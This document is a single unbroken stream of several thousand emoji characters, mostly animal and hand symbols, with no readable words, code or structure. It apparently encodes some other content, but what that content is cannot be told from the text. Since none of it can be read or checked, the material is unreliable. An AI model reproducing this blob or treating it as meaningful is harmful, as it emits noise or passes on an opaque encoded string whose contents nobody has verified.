👍👡👁👂👍👍👁👐👑🐽👧👎👉👍👧👰👍👋🐹👘👋🐩👅👪👚🐼👟👡👉👣👁👋👍👣👟🐺👎👣👐👯👎👣👅👊👄👣🐽🐬👌👤👫👢👘👣👁👫👌👣👣👑👙🐽👑👟👐🐩👯👎👚🐨👍👩👑🐽👛👠👉👥🐹👑👎👣👍👘👋🐨👑👏👊👣👑👏👍🐼👧👎👐👢👑👂👊🐽👑👨👊👢👑👣👍👣👑👑👎👢👑👮👙🐾🐼👱👈👢👣👏👎🐿🐹🐿👍🐻👁👊👍🐨👑👬👌👤👟👊👘👱👍👱👎👎👯👦👙🐨👛🐾👎👥👉👅👊🐾👉👪👌👡🐹👪👅🐽👌👰👛🐾👫👏👉🐧👧👀👍👎👯👪👎👤👁🐾👎👤👟👑👄👍👧👟👑🐼👛👊👊🐽👁👩👅👍👅👠👉👤🐰🐪👍🐩👯👎👐👍👈👯👎👣👟👋👙🐽👧👐👍👢👍👮👍🐨👣👩👎👢👫👋👉👣👧👯👌👤🐨🐾 👌🐩👁👍👙🐻👑👏👘🐨👧👩👐👌👛🐽👜🐾👅🐿👆👍👛👟👘🐧👧👦👍👢👉👂👋🐩👉🐾👊👥👁👟👉🐩👟👋👐👏👧👎👜👣👛👏👜🐾🐰👠👄👎👉🐿👍🐩🐬👊👋👣👛🐿👌👣👑👌👍👣👧🐿👋👋🐽👊👍👤🐽🐿👆👎👟👠👉👏🐹🐭👎👋🐹👘👚🐨👛👫👊👢👛👏👙👎👟👘👋👎🐬👦👎🐽👢👯👎👢👛👎👍👢👧 👱👍🐾👪🐨👍🐧🐨👍👙👱🐽👎👙👏🐹👃👋👢👑👉👜🐽👛👪👘🐽👉👠👉👥🐹👯👍👎👯👢👌🐨👣👎👌👣👑👏👙👌👑👆👋👍👑👮👜🐽👌👰👛🐻🐹👎👄👍👧👰👐🐧👑👮👎🐾🐼👯👚🐿👁👑👍👎👉🐾👑👌👛👆👉🐩👁🐾👘🐾👟👅👍👥🐹👭👍👤👫👊👊🐨👉👫👍👢👛👡👉👎👯👍👐👣👛👦👍🐽👉👏 👅👎🐰👎👍👤👉👏👍👎👪🐬👌👢🐨👏👌👥👧👎👄👎👟👭👍🐧👛👂👎👍👍👩👆👍👑👟👘🐨👧👀👍🐾👯👘👐👍👛🐽👅👍👑👇👍🐩👟👧👌👣👟🐹👛🐨👑👪👑🐻👉👡👄👎👉🐧👌🐩👫👢👎🐾👁👏👘🐾🐽👌👍👱👍👭👍🐧👑👩👜🐽👛👩👛🐾👫👊👘🐪🐹🐭👍👣👛🐫👋🐩🐽👎👊👏👧👑👄🐩👟👏 👐👋🐽👮👘🐽👑👌👉👣👑👣👉👤👉🐨👌🐩👪🐨👎🐽👁👐👈👥👟👎👍🐪👟👩👋👢👛🐾👉🐨👑👐👑🐾👟👊👍👋👍👌👍👎🐨🐫👛🐩👍🐾👍👏👣👢 👉🐪👉👦👐👣👍👮👍🐨👑👫👚🐾🐽👏👙🐽👧👏👐🐧👛👦👎👣👑👏👌👢👛👘👍👎👉👇👌🐧👌🐬👍🐨👧🐿👘🐾👟👅👊🐼👁🐩👍👤🐨🐧👌🐨👄👯👌👏👣👍👘🐩👉👌👐👤👫👮👙🐨👍👨👊👤🐰👎👉👤👯👑👐🐧👑👢👙🐾👁🐿👌👣👣👘👍👎👄🐨👐👍👌👯👎🐽👍👩👘🐽👛👅👘👣👑👌👍👢👛🐫👋🐨👅🐿👉👢👛👉👙🐽👧👧👍👢👍👍👛🐨👑👫👚🐼👛👍👄👍👧🐧👌👤👫👦👌🐽👑👫👘🐽👉👌👍👎👟🐻👋👣👑👘👊🐾👍🐿👉👤👧👅👍🐨👀👮👍👋👁 🐧👘🐨👛🐿👊👣👟👟👉🐧👑👍👍👥👧👎👛👣👐👮👎👥👁👣👉👤👉👰👎👢👑👢👍🐩🐼👱👈👡👑👎👘🐩👉🐭👋👍👑👢👉🐨👅👪👎👤👧👊👍🐪👟👐👎👎👯👦👈🐨👉🐾👌👥👁👏👙🐼👧👪👌👤🐨👊👜👣👣👍👎👣👅👟👉👋🐽👱👌🐩🐬👦👍🐨👑🐭👉👋🐹👘👉🐼👑👩👌👡👁👂👊👍👉👫👘🐽👅👟👜👣👑👈👍👢👑👘👐👎👈👰👍👢👛👎👎🐾👯👩👌👢👍👂👎🐽👉👎👎👥👛👣👍👤👫🐪👍🐩🐬👢👎🐽👀👮👍👡👉👑👄🐽👁👇👍🐩🐨🐽👜👍👍👩👑 🐾🐽👎👄🐩👟👀👎👋👀👯👊🐨👀👯👚🐼👟👠👉👤👟👋👍👣👟🐺👊🐨👑👫👄👋🐹👍👄👌🐨🐫👍👣👟👦👎🐽👛🐿👘🐽👣👑👙👏👟👟👍👡🐽👪👚 🐨👧🐿👆👍👛👊👙👏👟👘👎👋🐹👘👘🐩👁🐿👊👢👟👍👙🐾👯👟👍👣👛👅👄👍👣👎👍👏👟👏👉👣👑👰👐👌👑👢👋👤🐽👪👎👣👍👎👘🐩👈🐧👍🐻 🐽👆👊🐽👁👩👑🐽👁👠👉👥🐹👮👍👤👫👎👍👤👈👯👎👥👉👡👉👎👉👎👋👍👑👮👄🐽👍👫👛🐾🐰👍👉👣👧🐧👐👌👑👊👍👍👑👏👘🐼👉👌👙🐽👧👟👌🐧👛👎👊🐽👁👫👚🐼🐬👎👄👌👣🐪👍👣👉👂👄🐾🐼👯👑🐼👟👋👙🐾👟👦👌👡🐹👘👍👣👑👬👚🐽👛👢👙🐽👣🐪👍🐩🐬👂👙🐽👁👫👌👥👣👏👘🐨👧👩👍👡👁🐽👜👣🐽👨👎👣👛👟👄👣👀🐩👍🐽👑👘👎👤👈👮👄👍👛👏👙👎👯👪👐👋🐽👮👎👍👛👏👜🐾🐰👉👄👍👁🐿👍👎🐬👂👎🐾👁🐽👚🐿 👅👍👙👋🐽👋👑👎👯👪👍👣👛👪👋👤👟👎👘🐪🐸👯👍👍👛🐫👛🐨👐👰👊👣👣👍👙🐾👟👟👌👢👍👘👐👍👧👍👑🐼👫👋👍👢🐬👱👐👌👛👦👋👢🐨👍👚🐽👛👎👙🐾👅🐫👋👢👛👉👜👍👑👩👑🐽👛👠👙🐼👧👇👍👤👯👢👌🐨👐👯👌👣👟👢👊🐾👉👏👋👍👛🐫👜👍👑👏👄👌👛👏👉👢👣🐪👍👤👧👊👎👢🐨🐿👘🐼👯👎👄👥👟👟👍🐧👑👎👚👣👧🐿👉👣👛👎👄👌👧👉👍👣👉🐺👍👢🐬👎👎👏👟👡👉👎👟👦👌👡👁👦👋🐨👌👮👍👢👫👅👙🐽👧 🐧👋👍👉🐺👍👢🐨👍👄👋👉👎👍👤👟👱👍👤🐨🐽👜👍👍👪👍👣👧👠👎🐽👀👱👎👎👧🐾👍🐩👅👎👋👥👉👇👍👤👉👋👐👣👟👦👐👍👛👌👈👤🐽👟👄👢👧👀👌🐩👫👦👍👤👁🐿👜🐾👟👎👙🐾👉👆👋👍👑👪👍🐨👑👐👘🐽👟👊👙🐽👧🐬👎👍👍👘👘🐨👉👫👉👥👅👏👙🐽👑👏👐👋👁👉👄🐽👣👌 👉👢🐰👊👄👍👧🐨👍🐾👯👦👘👍👁👪👚🐽👣👏👍🐪👉👭👌👋🐽👆👍🐨👛👩👑🐽👑👟👄👣👁👏👍🐽👑👘👛🐧🐨🐾👍👥👉👢👉👱👣👎👌👤👯👪👅👍👣👍👘🐼👅👎👙👌👧👀👐👌👍👊👍👎👁👐👘🐿👁👎👙🐽👧🐿👑🐼👑👂👛🐾👅🐽👅👍👛👅👍👎👮👱👍👤👯👊👊🐧🐨🐿👉👏👟👘👉👎👟👌👐👢👛 👦👙🐨👍👨👈👤🐽👎👙🐽👧🐨👐🐧👑👢👘🐩👁🐾👙🐻👅👎👄👡👍👇👍🐻👁👂👉👤👅👀👚🐽👟👟👄👣👀👱👎👍👑👘👋🐨👁👪👋👥👁👠👉👤👉👆👐👤👯👂👜👍👛👐👚🐼👛👎👙👍👑👏👍🐾🐬👎👍🐾👁🐾👊👥🐹👎👙🐽👧🐪👍🐨👑👘👉🐨👣🐭👉👤👣👅👍🐨👁👀👍🐩👫👘👘🐨👛🐿👊👢👑👡👊🐼 🐬👎👐👣👉🐾👍🐽👧👏👜🐿👅👎👙🐾👉👱👍🐾🐨👦👍🐩🐼👱👈👏👟👎👍👤👈🐧👑🐻🐽👑👜👍👅👪👙🐽👑👠👉🐩👟👦👍👎👫👎👐👍👣👎👚🐽 👑👘👉👏👉👌👍👤👪🐨👜👣👣👍👑🐾🐰👌👘👱🐽👎👐🐧👑👘👍🐩👁🐿👋👡👉👌👘🐩👉👊👑👍👑👘👚👣👧🐾👑🐾👣👊👄👌👧🐩👍👣👚🐨👛🐩👄👰👊👏👟👍👙🐾👉👐👐👤🐨👊👚🐨👣👩👎👥👅👆👍👤👫🐪👍👤🐨🐧👍🐧🐨🐼👉👢👑👍👙👏🐹🐿👍🐩👯👘👎🐽👍👬👎👣👛👅👙👤👟👦👍👡🐹 👘👍🐩👅👪👚🐼👟👊👙🐾👉👏👋👍👍👮👌👣👑👪👑🐿👛👋👄👌👣🐫👌🐨👟👪👌🐩🐼👰👘🐿🐹👍👙👏👄👯👐🐧👑👪👍👍🐽👬👑🐼🐬👠👉👥🐸👮👍🐽👑👊👈🐨👑👩👄👍👑👅👍🐽👁👏👍👤🐨👦👜👣👑👫👄👌👑👣👍👣👑👱👍🐩👯👮👘👍👛🐾👊👏👧👏👍👣👑👟👍👡👁👊👊🐽👑👩👎👤👫👊👄🐧👁👌👎👎👫👦👈🐧🐬🐾👎👣👍👋👎🐾👉👇👍👡🐹👮👊👍👌👰👛🐾🐰👎👙👌👧👀👑👌👛👦👍🐩👁🐿👌👢🐰👌👍👣👧👱👍👡🐽👘👎👎🐽🐾👘🐽 👅👠👉👥🐸🐩👍🐨👑👎👐👎🐼👯👌👥👅👏👎🐾👯👦👌👢👍👮👎🐽👉👎👎👥👛👟👉👣👐🐩👌👤👫👮👙🐽👁👪👊👡🐽👎👙👏👟👃👐👍👑👂👚🐩 👅🐾👙🐽👛👊👙🐼👧👀👍👏👧🐹👄👎👄👯👑🐿👁👘👉👣👧👦👋👎👯👂👎🐽👑🐾👎👤🐽👢👄🐻🐽🐿👍👤🐬👊👘🐨👁🐭👙🐽👛👍👙👏👟👱👋👣👑👪👍👤🐽🐽👋👣👛👠👍👏🐹👁👎👍👍👎👋🐨👣👎👊👢👑👏👙👎👟👘👑👎👫👘👄🐨👍👪👎👣👛👢👉🐧🐬🐾👋👣👑👢👋👣👑👏👛🐪👧👎👙👏👟👋 👌👱🐸👯👊🐽👁👐👘🐾🐽👊👍🐩👟👍👎👎👫👢👙🐩👀👯👍👥🐽👉👙👌👑👏👐👢👑👮👄🐽👧👍👘🐾👫👌👘👱🐽👑👌👎👯👪👐👍👑👏👘🐼👯👑 👘🐨👧👘👑👌👑👢👚👤👁🐿👉👣👅👎👄👌👐👱👍👤👯👊👊🐨👁👫👍👥👅👊👙🐾👯👟👌👤🐨👦👚🐽👍👫👜🐿👛👠👄👎👉👏👍👎👫🐧👌🐧🐨👎👙🐻👉👏👘🐩👟👏👍👢👛👂👎🐾👍👀👋👣👧👎👉👍👦👱👍👡🐽👘👘🐨👛🐿👍👢👟👇👍👢👧👆👍👣👉🐽👄🐽👑👪👑🐻👉👟👄👎👯👏👌🐩👯👢👘👣 👅🐽👅👍👛👑👙🐽👁🐿👍👢👑👑👜👎👍🐿👛🐾👧👠👉👥🐹👎👍👎🐨🐫👘🐨👉👪👎👥👍👉👘👣👧👐👍👢👍👂👘🐽👑👨👉👤👫👊👄👎👉🐨👍🐾👯 👊👘🐼🐨👫👘🐾🐰👎👍🐪👉👏👎👍👑👪👍🐩👅🐾👎👤🐽👊👎🐽👁👍👍👤🐨👱👄👎👍👪👙🐽👑👘👉👱👣👍👐👏👧🐾👍🐨👢👮👎👤🐽👎👄👢👧 👀👍🐾👧👊👍👎🐼👰👌👣👅👘👍👣👧👟👐🐩👯👮👉🐨👧🐾👘🐽👅👅👄👤👞🐨👍👤👯👢👛🐨🐼👯👙🐽👟👌👘🐩👉👏👐👤👯👂👚🐨👌👮👑🐽👅👡👄👎👯👰👍🐩👯👢👋🐨👑👬👈👣👛👑👍👎👈👮👍🐧👑👁👛🐩👅🐽👘🐽👧👅👉👥🐹🐩👍👡👁👱👜🐽👅🐿👉👢👑👣👉👤👉👦👐👋🐽👮👙🐨👑👏 👄👋👉👟👄👢🐬🐧👍👤👫👢👐👍👁👌👍👣👟👑👙👏👉👃👌🐩👯👑👜🐽👍👩👚🐾👯👊👘👱🐼🐧👍👋🐽👦👙🐩🐽👪👊👣👟👟👊🐼👁👎👐👣👉🐾👛👣👑👩👎👤🐽👡👄👢👑🐾👍🐾👯👊👋👣👑👬👈👏👛👎👉👣👧👋👌👋🐽👘👚👢🐨👎👎👢🐬👎👉👢👧👐👎👎👫👢👙🐩👉👪👎👏👛👏👙👏👉👌👌👡🐹👘👊👍👣👍👎👤🐽👌👙🐼👧🐨👌👎🐧🐬👍🐩👁👌👉👋🐹👑👜👢👧👇👐👱🐽👮👊👍👅👫👛🐽👅👅👄🐼👧👍👍🐨👛🐧👙🐨🐼👮👅👌👛👏👙 🐽👑👌👍🐧👛👊👌🐽👑👨👈👥👛👋👍👣👍🐬👑🐼👚🐬👍🐩👁👍👚🐼👣👘👍👎👉👭👍👡👁👂👊🐽👍👩👆👍👍👎👙🐿🐹🐭👍👤👧🐾👐👍👛👏👉👢 👛👟👉👢🐬👧👌👤🐬🐹👄👣👐👯👎👣👛👑👍🐧👍🐫👍👎🐬👆👎🐽👛🐿👜🐾🐰👍👘🐨👑🐪👍🐧👑👊👍🐨👛👬👑🐾👟👊👙🐽👢👰👍👎🐨🐧👛🐩👁🐾👊👥👅👋👘👢👑👏👌👥👧🐾👊🐽👑👌👊👢👫👊👄👢🐬🐿👐👢👑👦👍🐧🐧👯👊👡👁👎👍👣👁🐺👋👍👛👅👜🐽👧👀👊👤👟👊👄🐨👁👌👍🐽👍👘👛🐨👛👎👑🐽👟👣👉🐧👑👘👍👤🐨👊👎🐽👐👰👜🐾🐰👟👄👌👦🐩👐👢👚🐬👍👍👑👪👎👥👧👌👙🐽👧👱👍👤🐨🐾👉👣👉👪👑🐾👣👎👎🐼👁👂👍 🐨👑👎👍🐨👈👯👙🐽👛👋👘🐨👧👐👐👣👛👦👐👍👧👏👛🐾🐽👅👄👍👑👱👍🐩👯👢👘🐨👀👮👅👌👛👌👙🐽👧👩👍🐾👯👘👎🐾👈👱👚🐽👛👠👎🐾👟👌👍👏👧🐹👜🐽👅🐾👋👣👣👠👉👢🐬👦👋👎👯👂👍👣👛👏👄👏👧👅👍👣👧👏👐👢👟👂👐👍👁🐭👙🐽👟👑👘🐨👧🐪👑👎👯👑👜👌🐬👏👛 🐽👍👟👜👢👑👐👎👋🐹👦👚🐨👐👮👄👏🐽👊👘🐩👟👘👍👡👅👦👘🐽👢👰👄👌🐰👊👍👢👑🐧👌👤👯👆👍🐧🐨👍👎👏👧👎👙👏👟👋👌👱🐽👂👛🐽👑👬👋👣👅👠👉🐪👟👦👍👎🐧👯👙🐩👅🐾👍👥👉👣👊🐾👉👧👋👍👛👊👎🐽👑👏👛🐻🐹👍👄🐻🐽👏👐👢👉👊👍🐨👁🐭👍👣👟👎👙🐾👉👃👍 🐧👛🐾👉👢🐰👎👍👣👛👣👘🐨👦👰👍👤👧🐾👐👎🐼👯👎👏👟👎👙👢👧👟👌👡👅👊👋🐨👣👌👉👥👛👋👍👣👧👯👌🐩👧👊👍🐧🐨👎👍👡👍👍👄👥👉👩👐👎👯👆👉👢🐬👎👑🐽👧👠👉👢👧👀👍👤👫👘👌🐨👐👯👑🐿👅👏👙👏👟👏👋👌👉👉👜👍👑👏👄👋👉👠👄👍👍🐬👌👣👟👮👌👤👁👍👎👣👟👎👙👋🐽👊👋👌👑👪👅👣👁👫👛🐽👅👅👍🐨👀👯👍👣👛🐫👐👍👐👯👊👣👑👡👉👱👣👏👍👡👅👊👎🐽👛👎👎👥👅👎👄👢🐬🐿👍🐩👯👦👘👍👛🐾👊👥👣👎👙👋🐼👮👑🐻👁👎👚🐨👛👬👌👢🐬👏👉👋👍👐👍🐽👑👎👚🐧🐬👪👙🐽👑👍👙👌👑👏👋👌👉🐾👎👍👑👎👘🐾👫👏👉👣👧🐧👍👎👯 👆👐👍👑👪👚🐾👟👑👄👥👟🐪👌👡🐽👮👉🐩🐽🐾👋👢🐬👅👙👎👚👯👍👤🐨🐫👘🐩👈👯👌👏👟👎👎🐾👯👌👍🐧👛👦👚🐽👌👮👍👋🐽👏👉👤👯🐧👋👍👑👆👎🐽👁👪👊👣👟👎👄👡👍👩👍🐾👯👂👛🐾👉🐼👋👣👟👟👄👍👧👰👍👡🐹👘👊👤👈👰👋👢👑👟👉👥🐹👆👌👤🐬🐺👄👣👑👨👊👥👧 👣👉👢🐬👀👌👤👫👘👙🐽👁👫👌👤🐰👑👍🐼👑🐪👐👡🐽👘👎🐼🐨👌👌👤👟👅👘👱👌👮👍👤🐨🐧👘🐨👣👎👊👏👣👟👉👱👣👍👍👢👍👂👋🐽👑 👏👜🐾🐽👡👄👍👑👰👎👢👛👦👋👣👑👌👉👋🐹👎👍🐼👑👭👐👡👁🐾👚🐨👅👪👘🐽👑👠👍🐩👟👏👎👎👯👦👋👤👍🐾👎👏👛👏👙🐿🐹👩👋👍👑👮👜👍👧🐽👍👋🐽👟👍👢👧🐨👌👍👟👢👍🐨👁👪👚🐽👉👍👍🐼👑👟👐🐩👪👯👍🐨👛👩👅👍👛👊👘🐪🐹👑👍👤🐧👮👜🐾👀👰👍👥👅👏👙👣👁👆👍👣👑👮👚🐨👑👫👜🐾🐽👣👙🐽👧🐧👑👌👟👢👘🐽👑👫👌👢👟👍👄👎👟🐪👍🐧👑👑👜👣🐽👩👘🐽👛👟👘🐪🐹👈👍👤👧🐾👌🐩👉👎👍👥👅👉👙🐾👉👧👍👤👫👮👍👣👐👯👑🐻👉👠👄👢👣🐫👐👢👑👢👐👍👁👪👎👣👅👑👙🐽👑👟👐👡🐽👊👎🐾👉👀👑🐽👉👎👙🐽👐🐨👎👢👍👡👅👍👐👰👊 👣👑👡👉👎👯👟👍👣👛👊👛👣👑👨👊👢👫👋👉👣👑👰👋🐨👑👎👍🐩👁👀👈👡👑👎👙👏🐹🐿👎👍👑👢👎🐽👁👩👑🐾👟👊👘👱👍👮👍👎🐧🐨👈👢 🐨👎👎👏👟👏👙🐾👉👘👍👡🐹👎👅🐽👑👏👅👍👅👍👄👢👧👰👋👣👑👪👎👤🐼👯👚🐾👟👎👄🐽👧👱👍👣👑👆👚🐨👅👩👅👍👅👠👉👤👫🐬👍👣👚👯👄🐼🐨🐿👉👥👁👅👍👤👯👊👐👋👅🐺👎🐽👣👪👘🐾🐰👎👉👤👯👏👍🐩👫🐧👘👢🐨👩👅👌👟👑👘🐨👧👭👍👡🐸👮👜🐽👅👫👆👍👟👟👄👌👧🐻👍🐽👑👢👋👤👍🐾👚🐼👣👋👙👎👟👋👋👋👁👦👍👍👑🐾👍👤🐽👢👄👢👑🐿👍🐩🐬👊👋👣👅🐿👘🐽👛👌👍👣👑👱👋👢👑👘👎🐼🐬👍👆👍👟👊 👄🐿🐹👏👍👡👁🐫👘🐨👑👫👊👣👣👟👉🐼🐬👍👍👣👑👮👘🐽👐👮👍👋🐽👎👙🐽👁👱👎👢👌🐨👘🐼🐧👮👊👢👫👎👄👍👧👏👍👡🐽👍👜🐽👛👪👘 🐽👉👠👉🐪👟👭👍👎👧👂👙🐨👛🐾👙🐿👁👏👙👤👉👎👌👤👯👮👜👣👐👰👛🐻🐹👟👘👱🐽👏👐🐧👟👪👍👎👁🐾👚🐿👁👑👍👤👉🐾👑🐻🐽👢👎👎👅 🐾👑🐾👣👏👉🐩👟🐫👍🐩👫👊👈👤👍🐾👎👏👟👍👙🐾👯👦👌👤👯👮👎👍👍👨👊👤🐰👏👙🐾👉👐👋👍👟👮👋👣👑👪👚🐽👟👑👘🐩👟👃👎👍👑👂👅👤👁🐾👘🐽👧👟👄👏🐸👱👎👣👛🐫👎👤👍👍👅👍👟👢👉👣👑👦👑👎👫👘👎👍👛👌👈👤🐰👡👄👍👣🐪👋👍👟🐾👌🐩🐼👰👘🐾🐽👎👘👢🐬 👭👐👌👑👩👜👌🐨👍👆👍👅👎👘🐪🐹🐭👎👍👍👢👙🐨👉👪👑🐼👑👋👙🐼👧👏👐👣👟👊👚👣👉👩👎👥👅👏👉👣👁🐨👍👎👯👎👘🐼🐨👎👚🐽👣 👏👍🐪👉👩👍👋🐽👘👉🐨👍👪👍👣👉👠👍🐾👯👮👍🐽👑👘👛🐩👍👎👎👣👟👢👉🐼👁👎👋👌👉🐾👎🐽👣👩👌👣👅👎👄👌👦🐩👍👤👯👦👍🐩👁👌👉👢👯👍👙👏👟👇👐👱👁🐾👉🐨👛👫👙🐽👅👟👄🐧👁👘👍👤🐨👮👉🐨👣👎👙🐽👛👋👎🐾👟👧👌👢👑👮👍🐽👣👪👑🐻👉👌👄👍👧👯👌👤👫🐧👍🐽👑👫👌👣👣👘👉👎👄🐨👍👋🐸👯👍🐩👅🐽👙🐽👑👠👉🐩👟🐩👎👍👛🐫👋🐨👁👩👅👍👛👘👉👥🐹👧👌👤👫👮👊👍👑👫👛🐾🐽👏👙👍👑👐👍 👤👫👦👘🐨👀👱👈👥🐹👍👙👋👍🐻👍👡🐽👘👎🐼🐨👌👌👤👣👅👍👣👐🐨👍👎👯👦👛🐨👍👫👊👣👑👏👙🐾👟👏👐👣👉🐾👌🐨👉👍👎👥👛👊👍👢👧👱👐🐧👛🐫👍🐩🐽🐭👍👡👑👏👍🐪👉👟👎👍👛🐾👍🐨👅👐👙🐾👟👊👜👤👯👐👍👤👧👆👌🐨👛🐾👑🐽👛👘👉👋👣👨👋👍👑👮👄👍👍👫👜🐽👅👟👉👋🐹🐫👌🐩👯👘👍🐩👁👌👉👋🐹👍👜👢🐽🐫👌👡👁👂👉🐨👛👪👘🐾👟👣👙👏👟🐩👍👣👛👮👉🐨👣👏👍👥👅👏👎🐾👯👨👌👡🐹👘👎🐽👉👍👌👢👛👏👍👣👧👏👐👌👛🐧👎🐽👁👪👚🐻🐹👎👍🐪👟👇👎👍👑👘👚🐩👅🐿👘🐽👧👅👙👤👞👱👍👎👧🐾👛🐨👀👰👉👢👛👌👘👱👍👆👐👣👛👡👜🐽👑👫👄👋👉👟👄🐻🐽🐿👍🐨👟👦👍👍👛🐿👘🐾👟👍👙🐾👉👋👍👡🐽👪👚👣👧🐾👋👣👟👎👙👏👞👮👍🐽👑👘👋🐩🐽👩👄👍👛👡👉🐼👁👟 👍👣👛👦👌🐽👑🐼👉👤🐽👢👍👢👑👱👎👢👑👮👍🐨👐👯👉👡👅👎👘👢👁👟👌🐩🐨👉👜👍👉👩👎👤👟👊👙👢👁👇👍👎🐧🐨👈🐧🐨👪👎👥🐽👋👙👥🐹👪👌👤👪🐨👊🐽👑👫👅👍👛👏👉🐧👧👀👍👎👪🐬👎👤👁👌👉👥👑👑👘👢👑👟👐🐨👑🐾👛🐽👁👪👑🐼🐬👟👜👣👐🐩👍🐨👉🐺👍🐩👀👯👍👏👣👋👘🐩👟👎👐👢👛👦👍👣👑👫👜🐾🐽👅👄👍👧👐👑👌👛🐾👘👢🐨👐👈👢👧👏👘🐨👧👋👍🐾👯👘👎🐾👉🐭👈👣👛👎👉👍👧🐩👎👏👧🐾👍👤👍👎👊👣👣👠👉🐩👟👌👌👣👍👮👎🐽👛👏👜🐾🐰👌👙👍👑🐿👐👋👅👢👎🐾👁👩👅👍👟👎👙👏👉👟👋👍👑👢👚👣👑👌👉👤👟👎👘🐪🐸👯👍👍👑👦👘🐨👐👯👊👥👅👡👉👣👁👎👍👢👍👘👘🐽👢👰👚🐪👟👎👄👎👉👰👋👣👑👢👌🐩🐼👱👈👣👧👎👙👋🐹🐪👑👌👛👁👜👍👑👬👋👣👟👠👙🐼👧👇👍👤👯👘👛🐩👄👯👎👥👉👣👉🐧👑👪👐👢👑👪👅👍👧👍👘🐾👫👟👉👣👧🐧👍👎👫👦👍👢🐨👏👘🐻👅👎👄🐽👧👟👐👱🐽👢👛🐾🐽🐾👑🐾👟👟👄🐧👁👍👍👣👉🐺👐👍👣👏👋👥👅👘👊🐽👁👩👌👤👪🐨👋🐨👉👍👍👥👛👎👙🐽👣🐫👎👢👉🐺👘👌🐨👍👍👡👅👌👙🐽👑👩👍🐧👛👂👉🐨👛👪👍👣👛👅👉🐨👁👌👍👣👍👘👐👎👅👎👉👥👍👘👉👣👁👏👐👢👑👑👄👍👛👩👍👤👧👆👍👣👣🐬👌🐩👯👘👘👣👁👏👜🐾👟👎👙🐾👉👋👑🐾👯👘👚👍 👅👩👛🐽👉👊👙🐽👧🐬👍🐻🐽👘👍🐨👐👰👊👢👣👉👘👣👧👏👐👣👟🐺👊🐽👛👎👎👤👫👏👉👢👧👰👐👌👛👮👌🐧🐨👬👘🐽👣👎👘👢👁👏👌👱 🐽👆👉🐨👛👬👌👤👯👊👄🐨👁👈👍👎👧🐺👍🐧🐬🐾👎👣👟👆👍👋👣👐👌👤🐨👊👊👍👧👍👐👱👍👎👙👌👍🐫👍🐩👧👆👍🐧🐨🐾👚🐽👉👎👘👢 👑👩👑🐽👑👮👊🐾🐽🐾👋👤👣👊👙👏👈🐨👍👤👯👡👜🐼🐨🐿👌👏👣👋👘🐩👉👌👐👤👪🐨👍👍👣👏👛🐾🐽👏👉👤👯👱👐👌👚🐬👍👍👁👫👜🐽👟👎👄👥👈👮👐👎👪👯👚👢🐬👍👘🐽👧👟👄👏🐹🐩👍👤👧🐹👛🐩👍🐾👋👥🐽👋👙🐾👉👏👐👢👍👮👊👍👛👎👌👢👛👏👙👍👑🐿👐🐧👍👪👍🐾👁👏👘🐽👉👌👍🐼👑👃👍👣👑👘👉🐨👑👫👉👤👫👅👘🐨👧👀👍👡👀🐨👌🐨👉👪👋👢👟👟👉👤👉👍👍👤👯👍👜🐽👐👮👎👣👧👣👍🐨👑👀👋🐨👛👦👋👣👑👏👆🐿👣👏👍🐪👉👨👋👣👑👘👍🐨👛👬👋👣👟👟👘👱👍👎👍👤👯👘👛🐩👍👪👎👥👉👣👉🐪👉👨👋👍👑👂👜👣👛👩👎👤👫👟👍👢🐬🐾 👌🐩🐨🐾👍🐧🐨👎👚🐽👟👎👘👢👑👎👑👌👑👢👛👍👅👩👅👍👛👠👍👢👧🐫👍👣👉🐺👍🐩👈👯👑🐼👛👠👊🐼👧👐👐👤🐨👊👍👍👍👫👅👌👅👊👄👍👣🐬👑🐼👉🐺👘🐼🐨👍👙🐻👅👌👙🐽👑👩👍👣👛👂👉🐩👅👀👊👣👛👊👄🐩👟👦👍👡🐹👢👌👤👍👫👋👢👛👘👉🐩👯👐👌👡👁👦👍👣👑👪 👘🐿👛👉👙👍👑🐿👍🐾👫👢👍🐾👁🐿👜🐾🐰👍👘👢👁👟👍👢👑👘👚👍👅👫👆👍👛👠👉🐨👁👑👎👢👍👢👄🐾🐽👍👄👏👁👠👉🐽👁👏👐👣👉👎👍🐽👑🐿 👜🐾🐽👆👙👌👧👀👌👤👯👢👘👍👛🐿👑🐪👧👏👙🐽👧👟👎👍👛👊👉👢🐨👎👎👤🐽👊👙🐽👧👭👎👣👛🐧👐👍👛👎👑🐽👍👉👙👋👣👨👋👍👑👪 👄🐨👉👎👘🐼👛👍👄👢👍🐬👐👌👛🐾👍🐩🐽👩👅👏👑👑👍👍👧👰👑👍👌👯👍👢🐰👎👋👣👛👟👄👎🐰🐪👍👣👚👯👅🐽👈👯👎👏👛👅👍👣👧👐👍🐧👟🐺👎🐽👣👪👘🐾🐰👎👉👣👐🐩👌👤👫🐧👘🐨👁👪👚🐻🐽👎👉🐪👟👇👐👍👑👁👜👤🐽🐿👆👍👛👎👜👢👀🐧👎👎👧👂👋🐨👀👯👎👥👍👍👙 👏👟👌👌👡🐽👂👛🐨👑🐾👎👤👫👍👄👎👉🐿👍🐩👯👦👘🐨👁🐽👊👣👛👌👍👍👁🐿👍🐨👑👘👎🐾👉🐿👆👍👛👟👜👢👐👯👎👍👍👦👛🐨👛🐾👎👥👅 👡👉👏👉👟👍👡👅👦👊🐽👣🐭👉👣👛👡👄👏🐹👀👐👌👛👦👙🐾👁🐾👙🐻👍👎👙👋🐽🐪👌👡🐽👪👎🐽👁👐👘🐾🐽👊👍🐩👟👐👎👍👉👂👙🐨👍👎👎👥👉👢👊🐾👉👍👋👍👑👮👄🐽👧🐽👘🐾👫👎👉👣👧👱👐🐧👟👮👎🐽👛👀👈👢👟👎👘🐨👍🐫👍🐧👑👎👚👤👁🐾👎👢🐬👠👙🐼👧👭👍🐨👑👢 👅🐽👈👯👊👥👁👆👍👤👉👟👌👤🐬🐺👚🐽👍👫👛🐿👛👋👍👣👧🐧👑🐼👛🐾👘🐧🐨👏👌👢👣👎👙👏👉👱👍👣👛👂👊🐽👍👬👈👣👑👟👘🐨👧👄👍🐾🐨🐫👐👎👅👪👘🐪👧👟👉🐩👯👆👍👤👯👑👄🐽👑👨👊👡🐹👑👍👤👉👀👌👤🐬👆👘👣👁👫👘🐽👟👑👍🐼👑👟👑👍👑👮👍👣👛👬👋👣👛👎👘 🐪🐹🐭👎👋🐹👢👅🐽👌👰👊👣👛👋👙👌👑👐👍👢👍👂👘🐽👛👎👑🐼👛👎👄👎👉👑👐👢👛👦👌🐩👁👏👘🐽👧👏👍🐪👉👩👍👎🐨👉👜🐽👧🐾👑 